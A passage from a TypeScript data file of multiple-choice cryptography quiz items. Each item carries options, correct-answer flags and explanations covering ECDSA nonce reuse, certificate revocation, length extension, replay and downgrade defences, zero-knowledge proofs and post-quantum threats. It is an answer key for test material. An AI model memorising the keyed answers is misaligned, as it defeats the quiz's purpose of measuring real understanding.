      { id: 'opt-a', label: 'A', text: 'The transaction signature becomes invalid and is rejected by network nodes without security impact.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'The public key length is halved, forcing an upgrade to RSA 4096.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'An observer can mathematically compute the user\'s secret private signing key d in milliseconds from the two public signatures using modular arithmetic.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'ECDSA nonces are public values; reusing them increases signature verification speed by 50%.', isCorrect: false }
    ],
    explanation: 'In ECDSA signature generation, r is derived from k * G and s = k^-1(z + r * d) mod n, where k is a per-signature random secret nonce and d is the private key. If the same nonce k is used to sign two different messages (z1 and z2), the two signatures share the same r value. An observer can calculate k = (z1 - z2) / (s1 - s2) mod n and immediately compute the private key d = (s1 * k - z1) / r mod n. (RFC 6979 specifies deterministic ECDSA to avoid bad RNG nonce generation).'
  },

  // 24. PKI Path Validation & Revocation (PKI / Certificate Trust) -> Correct Answer: D
  {
    id: 'crypto-24',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A client web browser receives an X.509 server certificate during a TLS connection to https://api.partner.com. The browser confirms the certificate is unexpired and signed by a trusted Root CA. What CRITICAL additional check must the client perform to ensure the server key was not compromised and revoked prior to expiration?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Check if the server IP address matches the DNS A record using reverse ARP lookups.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Re-encrypt the certificate using the client\'s local AES master key.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Check if the CA certificate supports SSH key authentication.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Verify certificate revocation status via Online Certificate Status Protocol (OCSP / OCSP Stapling) or Certificate Revocation Lists (CRLs), and verify Subject Alternative Name (SAN) hostname matching.', isCorrect: true }
    ],
    explanation: 'X.509 Certificate path validation requires multiple distinct steps: 1) Verifying signature chain validity up to a trusted Root CA; 2) Verifying validity dates (Not Before / Not After); 3) Verifying hostname matching against Subject Alternative Name (SAN) entries; 4) Checking Revocation Status via CRLs or OCSP/OCSP Stapling to ensure the key was not compromised and explicitly revoked by the CA prior to its expiration date.'
  },

  // 25. Length Extension Attack Immunity (Hash Functions / Length Extension) -> Correct Answer: A
  {
    id: 'crypto-25',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'Which of the following cryptographic hash functions is naturally IMMUNE to Merkle-Damgård length-extension attacks by virtue of its internal sponge construction?',
    options: [
      { id: 'opt-a', label: 'A', text: 'SHA-3 (Keccak)', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'SHA-256', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'SHA-512', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'MD5', isCorrect: false }
    ],
    explanation: 'MD5, SHA-1, SHA-256, and SHA-512 are built on the Merkle-Damgård construction, making them inherently vulnerable to length-extension attacks when used naively as H(Key || Message). SHA-3 is based on the Keccak sponge construction, which absorbs input into an internal state and squeezes output. The internal state size is larger than the output size, making length-extension attacks mathematically impossible against SHA-3.'
  },

  // 26. Authenticated Encryption Order: Encrypt-then-MAC (AEAD / Protocol Design) -> Correct Answer: B
  {
    id: 'crypto-26',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'Before modern AEAD ciphers (like AES-GCM) were standardized, developers combined symmetric ciphers and MACs manually. Why is "Encrypt-then-MAC" (EtM) cryptographically superior to "MAC-then-Encrypt" (MtE)?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Encrypt-then-MAC permits decrypting the payload before validating the MAC signature.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Encrypt-then-MAC computes the MAC over the ciphertext; the receiver verifies the MAC FIRST and drops tampered payloads immediately without attempting decryption, neutralizing padding oracle attacks.', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Encrypt-then-MAC encrypts the secret MAC key inside the initialization vector.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'MAC-then-Encrypt converts stream ciphers into public-key RSA signing algorithms.', isCorrect: false }
    ],
    explanation: 'In Encrypt-then-MAC (EtM), C = Enc(M), T = MAC(C). On receipt, the recipient computes and verifies T over C before attempting decryption. If T is invalid, the packet is immediately dropped. In MAC-then-Encrypt or Encrypt-and-MAC, the recipient must decrypt the ciphertext before verifying the MAC, exposing the decryption engine to padding oracle attacks, malleable ciphertexts, and side-channel vulnerabilities.'
  },

  // 27. Replay Attack Protection (Protocol Design / Replay Protection) -> Correct Answer: D
  {
    id: 'crypto-27',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A smart door lock app encrypts the string "UNLOCK_DOOR" using AES-GCM with a shared key and transmits it via Bluetooth. An attacker intercepts the encrypted Bluetooth signal and retransmits the exact same byte stream hours later to open the lock. What protocol defense prevents this Replay Attack?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Switch from AES-GCM mode to AES-256 in ECB mode.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Increase the AES key size from 128 bits to 4096 bits.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Obfuscate the Bluetooth MAC address inside client-side code.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Embed a cryptographically fresh challenge nonce, monotonically increasing sequence counter, or validated timestamp window inside the authenticated payload.', isCorrect: true }
    ],
    explanation: 'Replay attacks occur when an attacker intercepts a valid authenticated payload and re-transmits it unchanged. Encryption alone does not prevent replays if the ciphertext payload is static or predictable. Protocols protect against replay attacks by embedding fresh, non-repeating parameters into the authenticated payload: cryptographically random challenge nonces, monotonically increasing sequence numbers, or timestamp windows verified server-side.'
  },

  // 28. TLS Protocol Downgrade Mitigations (Protocol Security / Downgrade) -> Correct Answer: C
  {
    id: 'crypto-28',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An active network attacker intercepts a TLS handshake and modifies the ClientHello message to remove support for TLS 1.3 and AEAD ciphers, forcing the server to downgrade to SSL 3.0. How do modern TLS handshakes detect and defeat this protocol downgrade attack?',
    options: [
      { id: 'opt-a', label: 'A', text: 'The server transmits its unencrypted private key inside the ServerHello packet.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Modern web browsers automatically terminate connections exceeding 100 milliseconds.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Both peers compute an authenticated Finished message containing a cryptographic digest of ALL previous handshake messages; altering ClientHello invalidates Finished verification, aborting the connection.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'TLS protocol downgrades are prevented by local DNSSEC firewall rules.', isCorrect: false }
    ],
    explanation: 'TLS handshakes protect against active tampering and downgrade attacks via the Finished message. At the end of the handshake, both parties compute a MAC or digital signature over a transcript digest of every handshake message exchanged (ClientHello, ServerHello, etc.). If an attacker altered any handshake parameter (such as stripping strong cipher suites), the transcript digests will mismatch, causing the Finished verification to fail and aborting the connection.'
  },

  // 29. Hybrid Encryption Architecture (Primitive Capabilities) -> Correct Answer: A
  {
    id: 'crypto-29',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An engineer designs a secure document distribution platform. The requirements mandate: 1) Confidentiality so only intended recipients can read files; 2) Proof of publisher origin; 3) Tamper detection in transit. Which combination of cryptographic primitives correctly satisfies all three requirements?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Hybrid Encryption (Asymmetric key encapsulation / Symmetric AEAD data encryption) for confidentiality, combined with a Digital Signature (Publisher RSA/ECDSA private key signature) for origin authenticity and integrity.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'HMAC-SHA256 generated with the recipient\'s public key for confidentiality and authenticity.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Argon2id password hashing for confidentiality, paired with TLS certificates for storage.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'AES-ECB encryption for authenticity, paired with SHA-1 digests for confidentiality.', isCorrect: false }
    ],
    explanation: 'Achieving the three security goals requires matching primitives to their true capabilities: 1) Confidentiality: Hybrid encryption (using public-key crypto like RSA-OAEP/ECDH to share a symmetric key, then AES-GCM to bulk-encrypt the file); 2) Authenticity & Integrity: A Digital Signature (e.g., ECDSA) computed with the publisher\'s private key guarantees both origin non-repudiation/authenticity and data integrity.'
  },

  // 30. Blind Digital Signatures (Advanced Cryptographic Protocols) -> Correct Answer: B
  {
    id: 'crypto-30',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An anonymous credential or electronic voting platform requires a central authority to digitally sign a user\'s token to prove validity, WITHOUT allowing the authority to view the contents of the token or link the user identity to the token during redemption. Which cryptographic primitive enables this?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Homomorphic AES-GCM Encryption', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Blind Digital Signatures (e.g. David Chaum\'s Blind RSA / Privacy Pass tokens)', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Diffie-Hellman Key Derivation', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Cyclic Redundancy Checks (CRC-32)', isCorrect: false }
    ],
    explanation: 'Blind Signatures (pioneered by David Chaum) allow a client to "blind" a message (multiply by a random blinding factor) before sending it to a signing authority. The authority signs the blinded message without seeing its unblinded contents. The client then removes the blinding factor. The resulting unblinded signature is valid under the authority\'s public key, proving authenticity without revealing the payload or linking request to usage (used in Privacy Pass, e-cash, e-voting).'
  },

  // 31. Zero-Knowledge Proofs (Advanced Cryptography) -> Correct Answer: D
  {
    id: 'crypto-31',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A financial service allows users to prove to a lender that their account balance exceeds $100,000 WITHOUT revealing their exact account balance, identity, or full transaction history. Which cryptographic mechanism enables this capability?',
    options: [
      { id: 'opt-a', label: 'A', text: 'AES-CTR keystream reuse verification', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'SHA-256 HMAC digest comparisons', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Elliptic Curve Diffie-Hellman static key exchange', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Zero-Knowledge Proofs (ZKPs, such as zk-SNARKs or zk-STARKs)', isCorrect: true }
    ],
    explanation: 'Zero-Knowledge Proofs (ZKPs) enable one party (the prover) to mathematically prove to another party (the verifier) that a given statement is true (e.g., "my account balance is > $100,000") without revealing any underlying information beyond the validity of the statement itself. zk-SNARKs and zk-STARKs are prominent non-interactive ZKP constructions.'
  },

  // 32. Quantum Threat & Post-Quantum Cryptography (Post-Quantum Cryptography) -> Correct Answer: C
  {
    id: 'crypto-32',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'Shor\'s algorithm running on a sufficiently powerful quantum computer poses an existential threat to public-key cryptography. Which cryptographic primitives are rendered insecure by Shor\'s algorithm, and which class remains fundamentally resilient?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Symmetric ciphers (AES-256) are completely broken by Shor\'s algorithm, whereas RSA-2048 remains secure.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Hash functions (SHA-256) are broken in O(1) time by Shor\'s algorithm.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Asymmetric algorithms relying on integer factorization and discrete logarithms (RSA, Diffie-Hellman, ECDSA, ECC) are completely broken by Shor\'s algorithm; symmetric ciphers (AES-256) and hash functions (SHA-256) remain secure against Shor\'s algorithm.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'Quantum computers cannot execute mathematical matrix operations, making RSA immune to quantum threats.', isCorrect: false }
    ],
    explanation: 'Shor\'s algorithm solves integer factorization and discrete logarithms in polynomial time, completely destroying classical public-key cryptography (RSA, DH, ECDH, ECDSA). Conversely, symmetric primitives (AES) and cryptographic hash functions (SHA-256, SHA-3) are not susceptible to Shor\'s algorithm. Grover\'s algorithm provides a quadratic speedup for unstructured brute-force searches against symmetric keys, effectively halving key security (AES-256 retains 128 bits of post-quantum security).'
  },

  // 33. Cryptographic Agility Architecture (Cryptographic Agility) -> Correct Answer: A
  {
    id: 'crypto-33',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An enterprise security architect requires all microservices to implement "Cryptographic Agility" to prepare for transitioning to Post-Quantum Cryptography standards (e.g. ML-KEM/ML-DSA). What does Cryptographic Agility entail?',
    options: [
      { id: 'opt-a', label: 'A', text: 'Abstracting cryptographic operations behind flexible interfaces and configurable metadata headers (storing algorithm IDs alongside ciphertexts/signatures), enabling seamless algorithm upgrades without modifying core code or database schemas.', isCorrect: true },
      { id: 'opt-b', label: 'B', text: 'Automatically switching encryption algorithms every 60 seconds during active network connections.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'Storing private keys in public client-side JavaScript repositories to allow rapid code updates.', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'Replacing symmetric encryption with base64 encoding across all internal microservice APIs.', isCorrect: false }
    ],
    explanation: 'Cryptographic Agility is the architectural practice of designing applications, protocols, and data schemas so that cryptographic primitives (ciphers, key lengths, hash functions, signature schemes) can be easily swapped or upgraded without rewriting core software or destroying stored data. This requires storing metadata (e.g. algorithm identifier tags) alongside ciphertexts/signatures and using modular crypto provider interfaces.'
  },

  // 34. Fully Homomorphic Encryption (Homomorphic Encryption) -> Correct Answer: B
  {
    id: 'crypto-34',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'A cloud analytics platform needs to perform mathematical calculations and machine learning inference on encrypted patient records uploaded to the cloud, WITHOUT decrypting the data in cloud RAM at any point. Which cryptographic technology enables arbitrary computation directly on ciphertexts?',
    options: [
      { id: 'opt-a', label: 'A', text: 'AES-GCM Authenticated Encryption', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Fully Homomorphic Encryption (FHE)', isCorrect: true },
      { id: 'opt-c', label: 'C', text: 'Elliptic Curve Digital Signatures (ECDSA)', isCorrect: false },
      { id: 'opt-d', label: 'D', text: 'HMAC-SHA512 Message Authentication Codes', isCorrect: false }
    ],
    explanation: 'Fully Homomorphic Encryption (FHE) is a form of encryption that allows mathematical operations (addition and multiplication) to be performed directly on ciphertexts without prior decryption. The result of the computation remains encrypted and, when decrypted by the data owner using their private key, yields the exact result of the operations as if they had been performed on the unencrypted plaintext.'
  },

  // 35. Secure Cryptographic Storage Architecture (Secure Storage Architecture) -> Correct Answer: C
  {
    id: 'crypto-35',
    categoryId: 'crypto',
    category: 'CRYPTOGRAPHY',
    difficulty: 'HARD / ADVANCED',
    question: 'An online health portal designs a defense-in-depth cryptographic storage architecture for sensitive Patient Health Information (PHI). Which combination of layered cryptographic controls provides comprehensive protection across data-in-transit and data-at-rest?',
    options: [
      { id: 'opt-a', label: 'A', text: 'TLS 1.3 for transit, plain text storage in database tables, and public key backups in GitHub.', isCorrect: false },
      { id: 'opt-b', label: 'B', text: 'Base64 encoding for data at rest, HTTP port 80 for data in transit, and hardcoded RSA keys.', isCorrect: false },
      { id: 'opt-c', label: 'C', text: 'TLS 1.3 with Perfect Forward Secrecy for transit -> Application-Layer AEAD Field Encryption (AES-256-GCM / ChaCha20-Poly1305) before database write -> Envelope Encryption via HSM/KMS keys with strict IAM access policies -> Transparent Data Encryption (TDE) for underlying disk blocks.', isCorrect: true },
      { id: 'opt-d', label: 'D', text: 'MD5 hashing for database tables, combined with WAF rules that block incoming SQL queries.', isCorrect: false }
    ],
    explanation: 'Defense-in-depth for cryptographic storage mandates layered protection across all states: 1) Transit: TLS 1.3 with PFS protects data moving over networks; 2) Application Layer: AEAD field-level encryption protects sensitive fields before they ever reach database memory or disk logs; 3) Key Management: Envelope encryption using KMS/HSM hardware enforces least-privilege key access; 4) Storage/Disk Layer: Transparent Data Encryption (TDE) protects physical disk media against raw drive theft.'
  }
];

export const questionsData: QuestionItem[] = rawQuestionsData.map(normalizeQuestionOptions);
